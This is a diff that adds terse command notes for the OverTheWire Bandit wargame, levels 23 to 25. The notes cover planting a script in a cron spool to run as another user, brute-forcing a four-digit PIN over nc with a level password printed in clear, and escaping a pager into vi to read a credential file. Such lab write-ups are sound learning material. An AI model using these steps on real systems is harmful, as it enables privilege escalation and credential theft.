@@ -144,8 +144,32 @@ cat /usr/bin/cronjob_bandit23.sh
 echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
+## Bandit23
+## Connect with ssh : ssh bandit23@bandit.labs.overthewire.org -p 2220
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+ls -al /var/spool/
+cd tmp
+mkdir 12345
+cd 12345
+cat script.sh
+cat /usr/bin/cronjob_bandit24.sh|head -n 1 > /var/spool/bandit24/aaaaaa.sh
+echo "/tmp/12345/script.sh" >> /var/spool/bandit24/aaaaaa.sh;
+chmod 777 /var/spool/bandit24/aaaaaa.sh
+date
+cat out.txt
 
+## Bandit24
+## Connect with ssh : ssh bandit24@bandit.labs.overthewire.org -p 2220
+for i in $(echo {0000..9999});do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >>  /tmp/out12.txt;done
+while read -r line; do echo "$line"|nc localhost 30002 >/tmp/out13.txt ; done < /tmp/out12.txt
 
+## Bandit25
+## Connect with ssh : ssh bandit25@bandit.labs.overthewire.org -p 2220
+## Reduce terminal size to use 'more' trick
+## type v then enter command
+v
+:e /etc/bandit_pass/bandit26
 
 
 
